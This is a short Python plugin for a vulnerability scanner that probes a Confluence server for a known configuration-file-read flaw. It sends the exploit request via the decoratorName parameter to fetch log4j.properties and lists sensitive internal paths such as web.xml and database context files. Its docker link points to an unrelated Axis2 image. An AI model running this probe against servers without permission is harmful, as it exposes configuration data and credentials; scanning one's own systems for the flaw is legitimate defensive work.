# coding:utf8
import requests

def get_plugin_info():
    plugin_info = {
        "name": "Confluence跨站脚本攻击，配置文件读取",
        "info": "Confluence 可读取数据库配置文件，log4j.properties",
        "exp_url":"https://www.exploit-db.com/exploits/39170/",
        "docker":"https://github.com/ainehanta/docker-axis2/blob/master/Dockerfile",
        "other":""
    }
    return plugin_info

def check(ip, port, timeout):
    try:
        decoratorName = ["/WEB-INF/decorators.xml",
            "/WEB-INF/glue-config.xml",
            "/WEB-INF/server-config.wsdd",
            "/WEB-INF/sitemesh.xml",
            "/WEB-INF/urlrewrite.xml",
            "/WEB-INF/web.xml",
            "/databaseSubsystemContext.xml",
            "/securityContext.xml",
            "/services/statusServiceContext.xml",
            "com/atlassian/confluence/security/SpacePermission.hbm.xml",
            "com/atlassian/confluence/user/OSUUser.hbm.xml",
            "com/atlassian/confluence/security/ContentPermissionSet.hbm.xml",
            "com/atlassian/confluence/user/ConfluenceUser.hbm.xml"]
        url = ip+":"+port+"/spaces/viewdefaultdecorator.action?decoratorName=" + "log4j.properties"
        res = requests.get(url,timeout=timeout)
        if res.status_code == 200:
            return u'%s 存在Confluence配置文件读取漏洞 访问地址:%s' % (ip,url)
    except:
        pass
